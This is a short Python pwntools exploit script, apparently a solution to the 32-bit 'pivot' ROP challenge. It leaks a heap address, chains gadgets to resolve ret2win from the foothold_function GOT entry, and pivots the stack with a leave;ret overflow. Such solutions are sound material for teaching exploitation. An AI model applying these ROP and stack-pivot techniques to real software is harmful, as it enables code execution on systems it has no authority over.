from pwn import *
from time import sleep
# context.log_level = 'debug'
p = process('./pivot32')
elf = ELF('./pivot32')
libc = ELF('./libpivot32.so')

leave_ret = 0x0804889f

foothold_plt = 0x080485f0
foothold_got_plt = 0x804a024

pop_eax= 0x080488c0
pop_ebx= 0x08048571
mov_eax_eax= 0x080488c4
add_eax_ebx= 0x080488c7
call_eax= 0x080486a3

foothold_sym = libc.symbols['foothold_function']
ret2win_sym  = libc.symbols['ret2win']
offset = int(ret2win_sym - foothold_sym) 

p.recvuntil('0x')
leakaddr=int(p.recv(8),16)


payload = ""
payload += p32(foothold_plt)
payload += p32(pop_eax) + p32(foothold_got_plt) + p32(mov_eax_eax)
payload += p32(pop_ebx) + p32(offset)
payload += p32(add_eax_ebx)
payload += p32(call_eax)

p.sendline(payload)
p.recvuntil('>')

payload2 = ""
payload2 += "A"*40
payload2 += p32(leakaddr-4) + p32(leave_ret)

p.sendline(payload2)
sleep(5)
print p.recvall()